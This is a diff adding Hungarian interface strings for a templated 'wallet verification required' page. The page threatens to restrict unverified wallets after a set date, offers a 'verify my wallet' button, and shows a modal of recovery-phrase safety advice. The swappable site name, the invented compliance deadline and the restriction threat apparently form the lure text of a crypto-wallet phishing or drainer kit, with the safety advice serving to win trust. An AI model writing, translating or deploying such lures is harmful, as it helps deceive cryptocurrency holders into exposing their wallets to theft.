@@ -1,0 +1,31 @@
+﻿{
+    "pageTitle": "Pénztárca Ellenőrzés | {websiteName}",
+    "mainTitle": "Pénztárca Ellenőrzés Szükséges",
+    "description1": "A biztonsági szabványok és szabályozási megfelelőség fenntartása érdekében most már minden felhasználó számára pénztárca-cím ellenőrzést igényelünk.",
+    "deadlineText": "{date}-tól minden nem ellenőrzött pénztárca",
+    "restrictionText": " ideiglenesen korlátozott lesz",
+    "cooperationText": "Értékeljük együttműködését platformunk biztonságának fenntartásában.",
+    "termsText": "Egyetértek az {websiteName}",
+    "termsLink": "Használati Feltételeivel",
+    "verifyBtnText": "Ellenőrizni a Pénztárcámat",
+    "securityBtnText": "Kompromittált Kifejezésekről",
+    "modalTitle": "Biztonsági Figyelmeztetés: Kompromittált Helyreállítási Kifejezések",
+    "modalWarning": "Kritikus Figyelmeztetés:",
+    "modalWarningText": "A helyreállítási kifejezés a pénztárcája főkulcsa. Soha ne adja meg senkinek és ne írja be semmilyen weboldalon.",
+    "signsTitle": "Kompromittált kifejezés jelei:",
+    "signsList": [
+        "Megosztották valakivel, aki támogatásnak állítja be magát",
+        "Digitálisan tárolták (fotók, felhő, üzenetek)",
+        "Jogosulatlan tranzakciók a pénztárcájában"
+    ],
+    "actionTitle": "Azonnali intézkedés szükséges kompromittálás esetén:",
+    "actionList": [
+        "Azonnal helyezze át az összes pénzt egy új biztonságos pénztárcába",
+        "Generáljon teljesen új helyreállítási kifejezést",
+        "Soha ne használja a régi kifejezés egyetlen verzióját sem"
+    ],
+    "modalNote": "Megjegyzés: Az {websiteName} soha nem kéri a helyreállítási kifejezést. Ez az ellenőrzési folyamat csak a nyilvános pénztárca-címet igényli."
+} 
+
+
+
